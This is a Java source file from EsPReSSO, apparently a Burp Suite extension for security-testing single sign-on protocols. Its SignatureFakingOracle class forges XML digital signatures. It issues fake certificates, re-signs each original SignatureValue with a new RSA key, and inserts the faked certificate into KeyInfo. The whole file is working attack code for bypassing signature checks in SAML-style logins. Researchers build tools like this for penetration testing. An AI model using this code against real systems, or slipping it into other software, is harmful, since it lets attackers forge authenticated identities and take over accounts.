/**
 * EsPReSSO - Extension for Processing and Recognition of Single Sign-On Protocols.
 * Copyright (C) 2015 Tim Guenther and Christian Mainka
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package de.rub.nds.burp.utilities.attacks.signatureFaking;

import de.rub.nds.burp.utilities.Logging;
import de.rub.nds.burp.utilities.XMLHelper;
import de.rub.nds.burp.utilities.attacks.signatureFaking.exceptions.CertificateHandlerException;
import de.rub.nds.burp.utilities.attacks.signatureFaking.exceptions.SignatureFakingException;
import de.rub.nds.burp.utilities.attacks.signatureFaking.helper.CertificateHandler;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.Security;
import java.util.LinkedList;
import java.util.List;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.commons.codec.binary.Base64;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import wsattacker.library.xmlutilities.dom.DomUtilities;
import wsattacker.library.xmlutilities.namespace.NamespaceConstants;

/** 
 * Creates faked signatures by issuing a new certificate and resigning the original signature value
 * 
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 */
public class SignatureFakingOracle
{

    private Document doc;

    private List<Node> signatureValueElements;

    private List<Node> keyInfoElements;

    private List<String> certificates;

    private List<CertificateHandler> certHandlers;

    /**
     * Creates SignatureWrappingOracle, parses the document and searches for all the SignatureValue and KeyInfo elements
     * 
     * @param document
     * @throws SignatureFakingException
     */
    public SignatureFakingOracle( final Document document ) 
            throws SignatureFakingException
    {
        Security.addProvider( new BouncyCastleProvider() );
        signatureValueElements = new LinkedList<Node>();
        keyInfoElements = new LinkedList<Node>();
        certificates = new LinkedList<String>();
        certHandlers = new LinkedList<CertificateHandler>();
        doc = document;
        crawlSignatureElements();
        Logging.getInstance().log(getClass(), "found " + signatureValueElements.size() + " SignatureValue elements", Logging.DEBUG);
        crawlKeyInfoElements();
        Logging.getInstance().log(getClass(), "found " + keyInfoElements.size() + " KeyInfo elements containing X509 certificates", Logging.DEBUG);
    }

    /**
     * Creates fake signatures
     * 
     * @throws SignatureFakingException
     */
    public void fakeSignatures()
        throws SignatureFakingException
    {
        try
        {
            createFakedCertificates();
            for ( int i = 0; i < signatureValueElements.size(); i++ )
            {
                fakeSignature( i );
            }

        }
        catch ( CertificateHandlerException e )
        {
            throw new SignatureFakingException( e );
        }
    }

    public void fakeSignature( int i )
        throws CertificateHandlerException, SignatureFakingException
    {
        if ( signatureValueElements.size() != certHandlers.size() )
        {
            createFakedCertificates();
        }
        String signature = signatureValueElements.get( i ).getTextContent();
        CertificateHandler ch = certHandlers.get( i );
        byte[] newSignature = resignValue( Base64.decodeBase64( signature ), ch );
        signatureValueElements.get( i ).setTextContent( new String( Base64.encodeBase64( newSignature ) ) );
        appendCertificate( keyInfoElements.get( i ), ch.getFakedCertificateString() );
    }

    private void createFakedCertificates()
        throws CertificateHandlerException
    {
        for ( String cert : certificates )
        {
            CertificateHandler ch = new CertificateHandler( cert );
            ch.createFakedCertificate();
            certHandlers.add( ch );
        }
    }

    /**
     * Crawls all the collected KeyInfo elements and extracts certificates
     */
    private void crawlKeyInfoElements()
    {
        for ( Node ki : keyInfoElements )
        {
            List<Element> l = DomUtilities.findChildren( ki, "X509Certificate", NamespaceConstants.URI_NS_DS, true );
            if ( l.size() > 0 )
            {
                Node x509cert = l.get( 0 );
                if ( x509cert != null && x509cert.getLocalName().equals( "X509Certificate" ) )
                {
                    certificates.add( x509cert.getTextContent() );
                }
            }
        }
    }

    private void crawlSignatureElements()
        throws SignatureFakingException
    {
        // TODO replace with DOMUtilities
        NodeList nl = getSignatureElements();
        for ( int i = 0; i < nl.getLength(); i++ )
        {
            Node n = nl.item( i );
            NodeList children = n.getChildNodes();
            for ( int j = 0; j < children.getLength(); j++ )
            {
                Node current = children.item( j );
                if ( current.getNodeType() == Node.ELEMENT_NODE )
                {
                    if ( current.getLocalName().equals( "SignedInfo" ) )
                    {
                        Element signatureMethod =
                            DomUtilities.findChildren( current, "SignatureMethod", NamespaceConstants.URI_NS_DS, false ).get( 0 );
                        if ( signatureMethod != null && ( !isSignatureMethodSupported( signatureMethod ) ) )
                        {
                            throw new SignatureFakingException( "Signature " + "Algorithm not yet supported" );
                        }
                    }
                    else if ( current.getLocalName().equals( "SignatureValue" ) )
                    {
                        signatureValueElements.add( current );
                    }
                    else if ( current.getLocalName().equals( "KeyInfo" ) )
                    {
                        keyInfoElements.add( current );
                    }
                }
            }
        }
    }

    private boolean isSignatureMethodSupported( Node signatureMethodElement )
    {
        NamedNodeMap nl = signatureMethodElement.getAttributes();
        Node n = nl.getNamedItem( "Algorithm" );
        if ( n != null )
        {
            String algorithm = n.getTextContent();
            if ( algorithm.contains( "rsa-sha" ) )
            {
                return true;
            }
        }
        return false;
    }

    private void appendCertificate( Node keyInfo, String certificate )
    {
        keyInfo.setTextContent( "" );
        String prefix = keyInfo.getPrefix();
        if ( prefix == null )
        {
            prefix = "";
        }
        else
        {
            prefix = prefix + ":";
        }
        Node data = keyInfo.getOwnerDocument().createElementNS( NamespaceConstants.URI_NS_DS, prefix + "X509Data" );
        keyInfo.appendChild( data );
        Node cert =
            keyInfo.getOwnerDocument().createElementNS( NamespaceConstants.URI_NS_DS, prefix + "X509Certificate" );
        data.appendChild( cert );
        cert.setTextContent( certificate );
        Logging.getInstance().log(getClass(), "Appending Certificate \r\n" + certificate + "\r\nto the" + prefix + "X509Certificate element", Logging.DEBUG);
    }

    private byte[] resignValue( byte[] signatureValue, CertificateHandler ch )
        throws SignatureFakingException
    {
        PrivateKey privKey = ch.getFakedKeyPair().getPrivate();
        PublicKey pubKey = ch.getOriginalPublicKey();
        String alg = ch.getFakedCertificate().getSigAlgName();
        if ( alg.contains( "RSA" ) )
        {
            try
            {
                Cipher cipher = Cipher.getInstance( "RSA/None/NoPadding" );
                cipher.init( Cipher.ENCRYPT_MODE, pubKey );
                byte[] unsigend = cipher.doFinal( signatureValue );

                cipher = Cipher.getInstance( "RSA/None/NoPadding" );
                cipher.init( Cipher.DECRYPT_MODE, privKey );
                Logging.getInstance().log(getClass(), "New Signature value computed", Logging.DEBUG);
                return cipher.doFinal( unsigend );
            }
            catch ( BadPaddingException | IllegalBlockSizeException | InvalidKeyException
                    |NoSuchAlgorithmException | NoSuchPaddingException e )
            {
                throw new SignatureFakingException( e );
            }
        }
        else
        {
            return null;
        }
    }

    private NodeList getSignatureElements()
    {
        return doc.getElementsByTagNameNS( NamespaceConstants.URI_NS_DS, "Signature" );
    }

    public Document getDocument()
    {
        return doc;
    }
}